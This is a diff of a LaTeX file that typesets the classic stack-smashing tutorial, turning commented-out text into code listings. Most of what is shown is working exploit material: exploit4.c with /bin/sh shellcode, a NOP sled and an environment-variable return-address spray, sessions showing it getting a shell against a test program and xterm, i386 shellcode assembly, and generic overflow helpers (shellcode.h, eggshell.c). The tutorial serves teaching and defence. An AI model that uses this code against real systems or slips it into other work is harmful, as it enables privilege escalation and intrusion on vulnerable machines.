@@ -27,7 +27,7 @@
 %\begin{htmlonly}
 %\usepackage{html}
 %\end{htmlonly}
-%\usepackage{appendix}
+\usepackage{appendix}
 
 %\usepackage[dvips,CJKbookmarks,pdftitle={From TeX/LaTeX to PDF}%
 %                ,pdfsubject={From TeX/LaTeX to PDF}%
@@ -1244,133 +1244,104 @@ memory. This method also increases your changes of the exploit working as you ca
 variable holding the shell code as large as you want. The environment variables are stored in the top of the stack 
 when the program is started, any modification by setenv() are then allocated elsewhere. The stack at the 
 beginning then looks like this:
-\begin{comment}
 
-<strings><argv pointers>NULL<envp pointers>NULL<argc><argv>envp> Our new program will take an extra variable, the size of the variable containing the shellcode and NOPs. Our 
+\begin{verbatim}
+<strings><argv pointers>NULL<envp pointers>NULL<argc><argv>envp> 
+\end{verbatim}
+
+Our new program will take an extra variable, the size of the variable containing the shellcode and NOPs. Our 
 
 new exploit now looks like this:
 
-exploit4.c
+\begin{lstlisting}[caption=exploit4.c]
 
 #include <stdlib.h>
-
 #define DEFAULT_OFFSET                    0
-
 #define DEFAULT_BUFFER_SIZE             512
-
 #define DEFAULT_EGG_SIZE               2048
-
 #define NOP                            0x90
 
 char shellcode[] =
-
-  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
-
-  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46"
+  "\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+  "\x31\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
-unsigned long get_esp(void) {
-
+unsigned long get_esp(void) 
+{
    __asm__("movl %esp,%eax");
-
 }
 
-void main(int argc, char *argv[]) {
-
+void main(int argc, char *argv[]) 
+{
   char *buff, *ptr, *egg;
-
   long *addr_ptr, addr;
-
   int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
-
   int i, eggsize=DEFAULT_EGG_SIZE;
 
   if (argc > 1) bsize   = atoi(argv[1]);
-
   if (argc > 2) offset  = atoi(argv[2]);
-
   if (argc > 3) eggsize = atoi(argv[3]);
-
-  if (!(buff = malloc(bsize))) {
-
+  if (!(buff = malloc(bsize))) 
+  {
     printf("Can't allocate memory.\n");
-
     exit(0);
-
   }
 
-  if (!(egg = malloc(eggsize))) {
-
+  if (!(egg = malloc(eggsize))) 
+  {
     printf("Can't allocate memory.\n");
-
     exit(0);
-
   }
 
   addr = get_esp() - offset;
-
   printf("Using address: 0x%x\n", addr);
-
   ptr = buff;
-
   addr_ptr = (long *) ptr;
-
   for (i = 0; i < bsize; i+=4)
-
     *(addr_ptr++) = addr;
 
   ptr = egg;
-
   for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
-
     *(ptr++) = NOP;
 
   for (i = 0; i < strlen(shellcode); i++)
-
     *(ptr++) = shellcode[i];
 
   buff[bsize - 1] = '\0';
-
   egg[eggsize - 1] = '\0';  memcpy(egg,"EGG=",4);
-
   putenv(egg);
-
   memcpy(buff,"RET=",4);
-
   putenv(buff);
-
   system("/bin/bash");
-
 }
+\end{lstlisting}
 
 Lets try our new exploit with our vulnerable test program: 
 
+\begin{verbatim}
 [aleph1]$ ./exploit4 768
-
 Using address: 0xbffffdb0 
-
 [aleph1]$ ./vulnerable $RET
-
 $
+\end{verbatim}
 
 Works like a charm. Now lets try it on xterm: 
 
+\begin{CJK}{UTF8}{bsmi} %開始CJK環境，設定編碼，設定字體
+\begin{verbatim}
 [aleph1]$ export DISPLAY=:0.0
-
 [aleph1]$ ./exploit4 2148
-
 Using address: 0xbffffdb0
-
 [aleph1]$ /usr/X11R6/bin/xterm -fg $RET
-
 Warning: Color name
-
 ...°¤ÿ¿°¤ÿ¿°¤ ...
 
 Warning: some arguments in previous message were lost
-
 $
+\end{verbatim}
+\end{CJK}
 
 On the first try! It has certainly increased our odds. Depending on h ow much environment data the exploit 
 
@@ -1394,9 +1365,9 @@ function that reads a line from stdin into a buffer until either a terminating n
 
 checks for buffer overflows. The scanf() family of funct ions can also be a problem if you are matching a 
 
-sequence of non white space characters (%s),  or matching a non empty sequence of characters from a specified 
+sequence of non white space characters (\verb+%s+),  or matching a non empty sequence of characters from a specified 
 
-set (%[]), and the array pointed to by the char pointer, is not large enough to accept the whole sequence of 
+set (\verb+%[]+), and the array pointed to by the char pointer, is not large enough to accept the whole sequence of 
 
 characters,  and you have not defined the optional maximum field width. If the target of any of these functions is 
 
@@ -1414,48 +1385,38 @@ This fact becomes quite interesting once you realize that many comercial operati
 
 derived from the same sources as the free ones. Use the source d00d.
 
-Appendix A - Shellcode for Different Operating 
+%Appendix A - Shellcode for Different Operating 
+\appendix
+\appendixpage
+\section{Shellcode for Different Operating}
 
-Systems/Architectures
+\subsection{Systems/Architectures}
 
-i386/Linux
+%i386/Linux
 
+\begin{lstlisting}[caption=i386/Linux]
 jmp    0x1f
-
 popl   %esi
-
 movl   %esi,0x8(%esi)
-
 xorl   %eax,%eax
-
 movb   %eax,0x7(%esi)
-
 movl   %eax,0xc(%esi)
-
 movb   $0xb,%al
-
 movl   %esi,%ebx
-
 leal   0x8(%esi),%ecx
-
 leal   0xc(%esi),%edx
-
 int    $0x80
-
 xorl   %ebx,%ebx
-
 movl   %ebx,%eax
-
 inc    %eax
-
 int    $0x80
-
 call   -0x24
-
 .string \"/bin/sh\"
+\end{lstlisting}
 
      
 
+\begin{comment}
 SPARC/Solaris
 
 sethi   0xbd89a, %l6
@@ -1523,11 +1484,14 @@ xor     %o7, %o7, %o0
 mov     1, %g1
 
 ta      %l5 + 1
+\end{comment}
 
-Appendix B - Generic Buffer Overflow Program
+%Appendix B - Generic Buffer Overflow Program
+\section{Generic Buffer Overflow Program}
 
-shellcode.h
+%shellcode.h
 
+\begin{lstlisting}[caption=shellcode.h]
 #if defined(__i386__) && defined(__linux__)
 
 #define NOP_SIZE        1
@@ -1591,8 +1555,10 @@ unsigned long get_sp(void) {
 }
 
 #endif
+\end{lstlisting}
 
-eggshell.c
+%eggshell.c
+\begin{lstlisting}[caption=eggshell.c]
 
 /*
 
@@ -1739,7 +1705,7 @@ void usage(void) {
     "usage: eggshell [-a ] [-b ] [-e ] [-o ]\n");
 
 }
+\end{lstlisting}
 
-\end{comment}
 %\end{CJK}
 \end{document}
